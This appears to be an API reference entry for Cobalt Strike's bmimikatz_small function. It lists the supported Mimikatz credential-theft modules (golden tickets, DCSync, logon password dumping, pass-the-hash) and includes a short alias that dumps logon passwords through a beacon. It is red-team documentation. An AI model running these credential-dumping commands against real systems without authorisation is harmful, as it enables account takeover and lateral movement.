bmimikatz_small

Use Cobalt Strike's "smaller" internal build of Mimikatz to execute a mimikatz command.

#### Arguments

`$1` - the id for the beacon. This may be an array or a single ID.

`$2` - the command and arguments to run. Supports the semicolon ( **;** ) character to separate multiple commands

`$3 `- (optional) the PID to inject the mimikatz command into or $null

`$4 `- (optional) the architecture of the target PID (x86|x64) or $null

`$5` - (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

#### Note

This mimikatz build supports:

```
* kerberos::golden
* lsadump::dcsync
* sekurlsa::logonpasswords
* sekurlsa::pth```

All of the other stuff is removed for size. Use &bmimikatz if you want to bring the full power of mimikatz to some other offense problem.

#### Example

```
# Usage: logonpasswords_elevate [pid] [arch]
alias logonpasswords_elevate {
   if ($2 >= 0 && ($3 eq "x86" || $3 eq "x64")) {
      bmimikatz_small($1, "!sekurlsa::logonpasswords", $2, $3);
   } else {
      bmimikatz_small($1, "!sekurlsa::logonpasswords");
   }
}```
